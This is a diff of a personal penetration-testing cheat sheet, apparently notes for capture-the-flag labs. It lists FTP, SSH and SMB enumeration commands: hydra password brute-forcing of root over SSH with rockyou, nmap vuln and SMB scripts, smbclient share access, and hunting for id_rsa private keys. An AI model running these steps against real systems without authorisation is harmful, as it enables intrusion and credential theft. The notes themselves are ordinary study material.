@@ -1,10 +1,11 @@
 Enumeration
 FTP enumeration:
+nmap -sS -A -T4 subnet( to check if a host has open port 23 and allows anonymous login)
 Hydra -l username –p password ftp://IP ….we use small l if we know the user and we use capital L if we don’t know the user-
 ->ftp Ip
 ftp>get file.txt
 #SSH and Telnet Enumeration
-nmap -sV -p- 192.168.0.0/24
+nmap -sV -p- subnet
 hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://192.168.0.X
 ssh user@Ip
 banner grabing
@@ -23,11 +24,11 @@ smb: \> get flag.enc
 smb: \> exit
 :- file flag.enc( to identify encryption type)
 SMB Enumeration
-sudo nmap -A –p 445 192.168.18.110
-sudo nmap -sS -T4  --script vuln 192.168.18.110
->sudo nmap --script smb-os-discovery.nse 192.168.18.110
->nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse 192.168.18.110
-Smbclient  //10.10.10.10/share-U username
+sudo nmap -A –p 445 Ip
+sudo nmap -sS -T4  --script vuln IP
+>sudo nmap --script smb-os-discovery.nse IP
+>nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse IP
+Smbclient  //IP/share -U username
 If .ssh file is there when we do ls
 Then cd .ssh
 ls, we found id_rsa
